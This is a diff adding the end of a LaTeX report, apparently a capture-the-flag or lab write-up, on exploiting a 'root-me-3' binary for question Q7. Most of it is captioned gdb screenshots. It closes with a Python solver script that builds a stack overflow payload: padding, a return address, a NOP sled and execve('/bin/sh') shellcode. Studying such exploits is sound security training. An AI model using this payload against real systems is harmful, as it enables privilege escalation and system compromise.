+\label{fig:A7_main_greet}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_debug_mode.png}
+\caption{Disassembly of \textit{debug\_mode} Q7}
+\label{fig:A7_debug_mode}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_pattern_analysis.png}
+\caption{Crash Pattern Analysis \textit{root-me-3} Q7}
+\label{fig:A7_pattern_analysis}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_break_main.png}
+\caption{Breakpoint main Q7}
+\label{fig:A7_break_main}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_print_getuid.png}
+\caption{Print \textit{getuid} main Q7}
+\label{fig:A7_print_getuid}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_print_geteuid.png}
+\caption{Print \textit{geteuid} main Q7}
+\label{fig:A7_print_geteuid}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_break_debug.png}
+\caption{Breakpoint \textit{debug\_mode} Function Q7}
+\label{fig:A7_break_debug}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_print_eax.png}
+\caption{Print \textit{eax} after First getuid Q7}
+\label{fig:A7_print_eax}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_print_eax2.png}
+\caption{Print \textit{eax} after Second getuid Q7}
+\label{fig:A7_print_eax2}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_gdb_payload1.png}
+\caption{Payload Architecture Q7}
+\label{fig:A7_gdb_payload1}
+\end{figure}
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_gdb_payload2.png}
+\caption{Payload Architecture 2 Q7}
+\label{fig:A7_gdb_payload2}
+\end{figure}
+
+
+\begin{lstlisting}[caption={Solver Script Q7}, label={lst:Q7_exploit_script}]
+#!/usr/bin/env python2
+import struct
+import sys
+
+# Buffer start (ebp-0xd0)
+BUFFER_ADDR = 0xbffff4c8
+
+# 31 Bytes execve("/bin/sh") x86
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+    "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0"
+    "\x0b\xcd\x80"
+)
+
+# Payload: junk + EIP + NOP sled + shellcode
+offset = 212
+
+ # 4 ret_addr size to NOP start  and 32 to middle
+ret_addr = struct.pack("<I", BUFFER_ADDR + offset + 4 + 32)
+nop_sled = "\x90" * 64
+
+payload = (
+    "A" * offset +
+    ret_addr +
+    nop_sled +
+    shellcode
+)
+
+sys.stdout.write(payload)
+\end{lstlisting}
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_resolution.png}
+\caption{Exploiting \textit{root-me-3} Q7}
+\label{fig:A7_resolution}
+\end{figure}
+
+\end{document}
